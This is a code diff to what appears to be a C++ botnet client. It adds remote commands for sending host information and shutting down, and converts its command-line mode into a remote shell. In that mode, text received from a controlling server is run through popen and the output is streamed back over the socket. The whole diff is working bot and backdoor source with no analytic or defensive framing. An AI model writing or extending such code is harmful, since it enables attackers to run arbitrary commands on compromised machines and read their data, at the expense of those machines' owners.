@@ -68,6 +68,15 @@ bool BOT::main_loop()
 		case CMD_GET_CLI:
 			this->get_cli_mode();
 			break;
+		case CMD_GET_INFO:
+			if (this->send_client_info() == false)
+				goto err;
+			break;
+		case CMD_SHUTDOWN:
+			DEBUG(LOG_DEFAULT, "recv shutdown command, dying");
+			exit(0);
+		case CMD_ERR:
+			goto err;
 		default:
 			break;
 		}
@@ -75,6 +84,8 @@ bool BOT::main_loop()
 
 
 	return true;
+err:
+	return false;
 }
 
 int BOT::get_next_cmd(struct command_ctx *ctx)
@@ -90,6 +101,12 @@ int BOT::get_next_cmd(struct command_ctx *ctx)
 
 	if (strcmp(buff, "get_cli\n") == 0)
 		return CMD_GET_CLI;
+	if (strcmp(buff, "bye-bye\n") == 0)
+		return CMD_BYE;
+	if (strcmp(buff, "shutdown\n") == 0)
+		return CMD_SHUTDOWN;
+	if (strcmp(buff, "get_info\n") == 0)
+		return CMD_GET_INFO;
 	
 	return CMD_BYE;
 }
@@ -97,18 +114,40 @@ int BOT::get_next_cmd(struct command_ctx *ctx)
 bool BOT::get_cli_mode()
 {
 	char buff[BUF_SZ];
-	int len;
+	int len, ret;
 
 	DEBUG(LOG_DEFAULT, "try to get command line interface\n");
 
 	while (1) {
+		FILE *fp;
+
+		DEBUG(LOG_VERBOSE, "next get_cli_mode iter\n");
+
 		//FIXME: crude realisation.
+		//need to check is socket closed
 		if (this->socket->recv_msg(buff, &len, BUF_SZ) == false)
 			return false;
+		
 		buff[len] = '\0';
-		if (system(buff) == -1)
-			DEBUG(LOG_DEFAULT, "system(3) error. input msg is %s",
+		DEBUG(LOG_VERBOSE, "recv %d bytes,%s\n", len, buff);
+
+		if ((fp = popen(buff, "r")) == NULL) {
+			DEBUG(LOG_DEFAULT, "popen(3) error. input msg is %s",
 			    buff);
+			continue;
+		}
+
+		while (1) {
+			ret = fread(buff, 1, BUF_SZ, fp);
+			
+			if (ret == 0)
+				break;
+
+			if (this->socket->send_msg(buff, ret) == false)
+				return false;
+		}
+		//FIXME: check for errors
+		pclose(fp);
 	}
 
 	return true;
@@ -150,7 +189,7 @@ bool BOT::hand_shake()
 		return false;
 	}
 	
-	if (this->validate_server(buff, ret) == false) {
+	if (this->validate_server(buff, len) == false) {
 		DEBUG(LOG_DEFAULT, "Host validation fail\n");
 		return false;
 	}
@@ -162,6 +201,9 @@ bool BOT::hand_shake()
 
 bool BOT::validate_server(char *msg, int sz)
 {
+	DEBUG(LOG_VERBOSE, "recieved msg is %s sz = %d\n",
+	    msg, sz);
+
 	if (strncmp(HELLO_ACK, msg, sz) != 0)
 		return false;
 
